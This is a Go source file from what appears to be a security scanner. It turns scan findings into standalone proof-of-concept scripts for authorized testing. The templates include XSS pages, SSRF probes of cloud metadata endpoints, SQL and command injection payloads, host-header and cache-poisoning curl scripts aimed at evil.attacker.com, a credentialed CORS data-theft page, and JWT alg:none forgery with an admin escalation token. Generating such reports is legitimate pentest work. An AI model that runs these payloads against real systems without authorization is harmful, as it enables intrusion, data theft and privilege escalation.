package report

import (
	"fmt"
	"strings"

	"github.com/stormbane-security/beacon/internal/finding"
)

const pocDisclaimer = `DISCLAIMER: This proof-of-concept is generated for authorized security testing only.
Only use against systems you own or have explicit written permission to test.
Unauthorized access to computer systems is illegal.`

// GeneratePoC creates a standalone proof-of-concept file for a finding.
// It returns the file content, a suggested filename, and any error.
// The PoC format is chosen based on the finding's check ID.
func GeneratePoC(f finding.Finding) (content string, filename string, err error) {
	if f.CheckID == "" {
		return "", "", fmt.Errorf("finding has no check ID")
	}

	id := string(f.CheckID)
	safe := sanitizeFilename(f.Asset)

	switch {
	case id == "web.xss":
		return pocXSS(f), fmt.Sprintf("poc-xss-%s.html", safe), nil

	case id == "web.ssrf" || id == "web.pdf_ssrf":
		return pocSSRF(f), fmt.Sprintf("poc-ssrf-%s.py", safe), nil

	case id == "web.sqli":
		return pocSQLi(f), fmt.Sprintf("poc-sqli-%s.py", safe), nil

	case id == "web.command_injection":
		return pocCmdInjection(f), fmt.Sprintf("poc-cmdinj-%s.py", safe), nil

	case id == "web.host_header_injection":
		return pocHostHeader(f), fmt.Sprintf("poc-hostheader-%s.sh", safe), nil

	case id == "cache.poison_unkeyed":
		return pocCachePoison(f), fmt.Sprintf("poc-cachepoison-%s.sh", safe), nil

	case strings.HasPrefix(id, "web.cors_") || id == "nuclei.misconfigured_cors":
		return pocCORS(f), fmt.Sprintf("poc-cors-%s.html", safe), nil

	case strings.HasPrefix(id, "jwt."):
		return pocJWT(f), fmt.Sprintf("poc-jwt-%s.py", safe), nil

	default:
		return pocDefault(f), fmt.Sprintf("poc-%s-%s.sh", sanitizeFilename(id), safe), nil
	}
}

// sanitizeFilename replaces characters unsafe for filenames with hyphens.
func sanitizeFilename(s string) string {
	var b strings.Builder
	for _, c := range s {
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9', c == '-', c == '_':
			b.WriteRune(c)
		default:
			b.WriteByte('-')
		}
	}
	out := b.String()
	// Collapse multiple hyphens.
	for strings.Contains(out, "--") {
		out = strings.ReplaceAll(out, "--", "-")
	}
	return strings.Trim(out, "-")
}

func evidenceStr(f finding.Finding, key string) string {
	if v, ok := f.Evidence[key].(string); ok {
		return v
	}
	return ""
}

func targetURL(f finding.Finding) string {
	for _, key := range []string{"url", "matched_at", "endpoint", "path"} {
		if v := evidenceStr(f, key); v != "" {
			return v
		}
	}
	if f.Asset != "" {
		return "https://" + f.Asset
	}
	return "https://TARGET"
}

func pocXSS(f finding.Finding) string {
	url := targetURL(f)
	payload := evidenceStr(f, "payload")
	if payload == "" {
		payload = "<script>alert(document.domain)</script>"
	}
	return fmt.Sprintf(`<!--
PoC: Cross-Site Scripting (XSS)
Check ID: %s
Asset: %s
%s
-->
<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC — %s</title>
    <style>
        body { font-family: monospace; margin: 2em; background: #1a1a2e; color: #e0e0e0; }
        .info { background: #16213e; padding: 1em; border-radius: 4px; margin-bottom: 1em; }
        iframe { width: 100%%; height: 400px; border: 1px solid #e94560; }
        a { color: #e94560; }
    </style>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <div class="info">
        <p><strong>Target:</strong> %s</p>
        <p><strong>Payload:</strong> <code>%s</code></p>
        <p><strong>Description:</strong> %s</p>
    </div>
    <h2>Click to trigger (opens in new tab):</h2>
    <p><a href="%s" target="_blank" rel="noopener">Open vulnerable URL</a></p>
    <h2>Iframe embed:</h2>
    <iframe src="%s" sandbox="allow-scripts"></iframe>
</body>
</html>
`, f.CheckID, f.Asset, pocDisclaimer, f.Asset, url, escapeHTML(payload), f.Description, url, url)
}

func pocSSRF(f finding.Finding) string {
	url := targetURL(f)
	param := evidenceStr(f, "parameter")
	if param == "" {
		param = "url"
	}
	return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC: Server-Side Request Forgery (SSRF)
Check ID: %s
Asset: %s
%s
"""

import requests
import sys

TARGET = "%s"
PARAM = "%s"

# Internal targets to probe via SSRF
INTERNAL_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",       # AWS metadata
    "http://metadata.google.internal/",                 # GCP metadata
    "http://169.254.169.254/metadata/instance",         # Azure metadata
    "http://127.0.0.1:80/",                             # localhost
]

def main():
    print(f"[*] SSRF PoC against {TARGET}")
    print(f"[*] Vulnerable parameter: {PARAM}")
    print()

    for internal in INTERNAL_TARGETS:
        try:
            resp = requests.get(TARGET, params={PARAM: internal}, timeout=10)
            status = resp.status_code
            length = len(resp.content)
            print(f"[{'!' if status == 200 else '-'}] {internal} => HTTP {status} ({length} bytes)")
            if status == 200 and length > 0:
                print(f"    Response preview: {resp.text[:200]}")
        except requests.RequestException as e:
            print(f"[-] {internal} => Error: {e}")

    print()
    print("[*] Done. If any internal target returned content, SSRF is confirmed.")

if __name__ == "__main__":
    main()
`, f.CheckID, f.Asset, pocDisclaimer, url, param)
}

func pocSQLi(f finding.Finding) string {
	url := targetURL(f)
	param := evidenceStr(f, "parameter")
	if param == "" {
		param = "id"
	}
	payload := evidenceStr(f, "payload")
	if payload == "" {
		payload = "' OR 1=1--"
	}
	return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC: SQL Injection
Check ID: %s
Asset: %s
%s
"""

import subprocess
import sys

TARGET = "%s"
PARAM = "%s"
PAYLOAD = """%s"""

def main():
    print(f"[*] SQL Injection PoC against {TARGET}")
    print(f"[*] Vulnerable parameter: {PARAM}")
    print()

    # Method 1: curl command for manual verification
    print("[*] === Manual curl command ===")
    curl_cmd = f'curl -sk "{TARGET}" --data-urlencode "{PARAM}={PAYLOAD}"'
    print(f"    {curl_cmd}")
    print()

    # Method 2: sqlmap automated exploitation
    print("[*] === sqlmap command (automated) ===")
    sqlmap_cmd = f'sqlmap -u "{TARGET}" -p "{PARAM}" --batch --level=3 --risk=2'
    print(f"    {sqlmap_cmd}")
    print()

    # Method 3: Run curl probe
    print("[*] === Running probe ===")
    try:
        result = subprocess.run(
            ["curl", "-sk", "-o", "/dev/null", "-w", "%%{http_code} %%{size_download}",
             TARGET, "--data-urlencode", f"{PARAM}={PAYLOAD}"],
            capture_output=True, text=True, timeout=15,
        )
        print(f"    Response: {result.stdout.strip()}")
    except Exception as e:
        print(f"    Error: {e}")

if __name__ == "__main__":
    main()
`, f.CheckID, f.Asset, pocDisclaimer, url, param, payload)
}

func pocCmdInjection(f finding.Finding) string {
	url := targetURL(f)
	param := evidenceStr(f, "parameter")
	if param == "" {
		param = "cmd"
	}
	payload := evidenceStr(f, "payload")
	if payload == "" {
		payload = "; sleep 5"
	}
	return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC: OS Command Injection
Check ID: %s
Asset: %s
%s
"""

import requests
import time
import sys

TARGET = "%s"
PARAM = "%s"

# Time-based detection payloads
PAYLOADS = [
    "%s",
    "; sleep 5",
    "| sleep 5",
    "$$(sleep 5)",
    ` + "`" + `sleep 5` + "`" + `,
]

def main():
    print(f"[*] Command Injection PoC against {TARGET}")
    print(f"[*] Vulnerable parameter: {PARAM}")
    print()

    # Baseline request
    start = time.time()
    try:
        baseline = requests.get(TARGET, timeout=15)
        baseline_time = time.time() - start
        print(f"[*] Baseline response: {baseline.status_code} in {baseline_time:.2f}s")
    except requests.RequestException as e:
        print(f"[-] Baseline failed: {e}")
        baseline_time = 1.0

    print()

    for payload in PAYLOADS:
        start = time.time()
        try:
            resp = requests.get(TARGET, params={PARAM: payload}, timeout=20)
            elapsed = time.time() - start
            delta = elapsed - baseline_time
            indicator = "!" if delta > 4.0 else "-"
            print(f"[{indicator}] Payload: {payload!r}")
            print(f"    Response: HTTP {resp.status_code} in {elapsed:.2f}s (delta: {delta:+.2f}s)")
        except requests.RequestException as e:
            print(f"[-] Payload: {payload!r} => Error: {e}")

    print()
    print("[*] Payloads with [!] indicate time-based command injection.")

if __name__ == "__main__":
    main()
`, f.CheckID, f.Asset, pocDisclaimer, url, param, payload)
}

func pocHostHeader(f finding.Finding) string {
	url := targetURL(f)
	return fmt.Sprintf(`#!/bin/bash
# PoC: Host Header Injection
# Check ID: %s
# Asset: %s
# %s

set -e

TARGET="%s"
EVIL_HOST="evil.attacker.com"

echo "[*] Host Header Injection PoC against $TARGET"
echo

echo "[*] Test 1: Injected Host header"
curl -sk -H "Host: $EVIL_HOST" "$TARGET" -o /dev/null -D - 2>/dev/null | grep -iE "(location|host|set-cookie)" || echo "    (no reflection detected)"
echo

echo "[*] Test 2: X-Forwarded-Host injection"
curl -sk -H "X-Forwarded-Host: $EVIL_HOST" "$TARGET" -o /dev/null -D - 2>/dev/null | grep -iE "(location|host|set-cookie)" || echo "    (no reflection detected)"
echo

echo "[*] Test 3: X-Host injection"
curl -sk -H "X-Host: $EVIL_HOST" "$TARGET" -o /dev/null -D - 2>/dev/null | grep -iE "(location|host|set-cookie)" || echo "    (no reflection detected)"
echo

echo "[*] If any test shows the evil host in Location or response headers, host header injection is confirmed."
echo "[*] This can lead to: password reset poisoning, cache poisoning, SSRF."
`, f.CheckID, f.Asset, pocDisclaimer, url)
}

func pocCachePoison(f finding.Finding) string {
	url := targetURL(f)
	header := evidenceStr(f, "unkeyed_header")
	if header == "" {
		header = "X-Forwarded-Host"
	}
	return fmt.Sprintf(`#!/bin/bash
# PoC: Cache Poisoning via Unkeyed Header
# Check ID: %s
# Asset: %s
# %s

set -e

TARGET="%s"
UNKEYED_HEADER="%s"
EVIL_VALUE="evil.attacker.com"

echo "[*] Cache Poisoning PoC against $TARGET"
echo "[*] Unkeyed header: $UNKEYED_HEADER"
echo

echo "[*] Step 1: Send poisoned request (inject payload via unkeyed header)"
curl -sk -H "$UNKEYED_HEADER: $EVIL_VALUE" "$TARGET" -D - -o poisoned_response.html 2>/dev/null
echo

echo "[*] Step 2: Fetch the same URL without the header (should be cached)"
sleep 1
curl -sk "$TARGET" -D - -o cached_response.html 2>/dev/null
echo

echo "[*] Step 3: Check if poison persisted in cache"
if grep -q "$EVIL_VALUE" cached_response.html 2>/dev/null; then
    echo "[!] CONFIRMED: Cache poisoning successful — evil value found in cached response"
else
    echo "[-] Cache did not reflect the poisoned value (may need multiple attempts or different cache key)"
fi

echo
echo "[*] Cleanup: rm -f poisoned_response.html cached_response.html"
`, f.CheckID, f.Asset, pocDisclaimer, url, header)
}

func pocCORS(f finding.Finding) string {
	url := targetURL(f)
	return fmt.Sprintf(`<!--
PoC: CORS Misconfiguration
Check ID: %s
Asset: %s
%s
-->
<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC — %s</title>
    <style>
        body { font-family: monospace; margin: 2em; background: #1a1a2e; color: #e0e0e0; }
        .info { background: #16213e; padding: 1em; border-radius: 4px; margin-bottom: 1em; }
        pre { background: #0f3460; padding: 1em; border-radius: 4px; overflow-x: auto; }
        button { background: #e94560; color: white; border: none; padding: 0.5em 1em; cursor: pointer; border-radius: 4px; }
        .success { color: #4ecca3; }
        .error { color: #e94560; }
    </style>
</head>
<body>
    <h1>CORS Misconfiguration PoC</h1>
    <div class="info">
        <p><strong>Target:</strong> %s</p>
        <p><strong>Description:</strong> %s</p>
        <p>This page demonstrates that the target reflects arbitrary Origin headers
        with Access-Control-Allow-Credentials: true, allowing cross-origin data theft.</p>
    </div>

    <button onclick="exploitCORS()">Exploit CORS</button>
    <h2>Response:</h2>
    <pre id="output">Click the button to send a cross-origin request...</pre>

    <script>
    function exploitCORS() {
        const target = "%s";
        const output = document.getElementById("output");

        output.textContent = "Sending cross-origin request to " + target + "...\n";

        fetch(target, {
            method: "GET",
            credentials: "include",
        })
        .then(resp => {
            const cors = resp.headers.get("Access-Control-Allow-Origin");
            const creds = resp.headers.get("Access-Control-Allow-Credentials");
            output.textContent += "ACAO: " + cors + "\n";
            output.textContent += "ACAC: " + creds + "\n\n";
            return resp.text();
        })
        .then(body => {
            output.textContent += "Response body (first 500 chars):\n";
            output.textContent += body.substring(0, 500);
            output.className = "success";
        })
        .catch(err => {
            output.textContent += "Error: " + err + "\n";
            output.textContent += "(This is expected if CORS headers are not reflected for this origin)";
            output.className = "error";
        });
    }
    </script>
</body>
</html>
`, f.CheckID, f.Asset, pocDisclaimer, f.Asset, url, f.Description, url)
}

func pocJWT(f finding.Finding) string {
	url := targetURL(f)
	token := evidenceStr(f, "token")
	if token == "" {
		token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
	}
	return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC: JWT Vulnerability
Check ID: %s
Asset: %s
%s
"""

import base64
import json
import hmac
import hashlib
import sys

TARGET = "%s"
ORIGINAL_TOKEN = "%s"

def b64url_decode(s):
    s += "=" * (4 - len(s) %% 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        print("[-] Invalid JWT format")
        return None, None
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload

def forge_alg_none(header, payload):
    """Forge a token with alg:none (CVE-2015-9235)."""
    header["alg"] = "none"
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(payload).encode())
    return f"{h}.{p}."

def forge_empty_secret(header, payload):
    """Forge a token signed with empty HMAC secret."""
    header["alg"] = "HS256"
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(payload).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
    s = b64url_encode(sig)
    return f"{h}.{p}.{s}"

def main():
    print(f"[*] JWT PoC against {TARGET}")
    print()

    header, payload = decode_jwt(ORIGINAL_TOKEN)
    if header is None:
        sys.exit(1)

    print(f"[*] Original header: {json.dumps(header)}")
    print(f"[*] Original payload: {json.dumps(payload)}")
    print()

    # Test 1: alg:none
    none_token = forge_alg_none(dict(header), dict(payload))
    print("[*] === alg:none attack ===")
    print(f"    Token: {none_token}")
    print(f"    curl -sk -H 'Authorization: Bearer {none_token}' {TARGET}")
    print()

    # Test 2: empty secret
    empty_token = forge_empty_secret(dict(header), dict(payload))
    print("[*] === Empty HMAC secret ===")
    print(f"    Token: {empty_token}")
    print(f"    curl -sk -H 'Authorization: Bearer {empty_token}' {TARGET}")
    print()

    # Test 3: Tampered payload (privilege escalation)
    tampered = dict(payload)
    tampered["role"] = "admin"
    tampered["admin"] = True
    tampered_token = forge_alg_none(dict(header), tampered)
    print("[*] === Privilege escalation (admin role) ===")
    print(f"    Token: {tampered_token}")
    print(f"    curl -sk -H 'Authorization: Bearer {tampered_token}' {TARGET}")
    print()

    print("[*] Test each forged token against the target to verify acceptance.")

if __name__ == "__main__":
    main()
`, f.CheckID, f.Asset, pocDisclaimer, url, token)
}

func pocDefault(f finding.Finding) string {
	proofCmd := f.ProofCommand
	if proofCmd == "" {
		proofCmd = fmt.Sprintf("# No proof command available for check %s\necho 'Manual verification required for: %s'",
			f.CheckID, f.Asset)
	}
	return fmt.Sprintf(`#!/bin/bash
# PoC: %s
# Check ID: %s
# Asset: %s
# %s

set -e

echo "[*] %s"
echo "[*] Target: %s"
echo

# Proof command from beacon finding:
%s
`, f.Title, f.CheckID, f.Asset, pocDisclaimer, f.Title, f.Asset, proofCmd)
}

// escapeHTML performs minimal HTML escaping for use in PoC templates.
func escapeHTML(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, "\"", "&quot;")
	return s
}
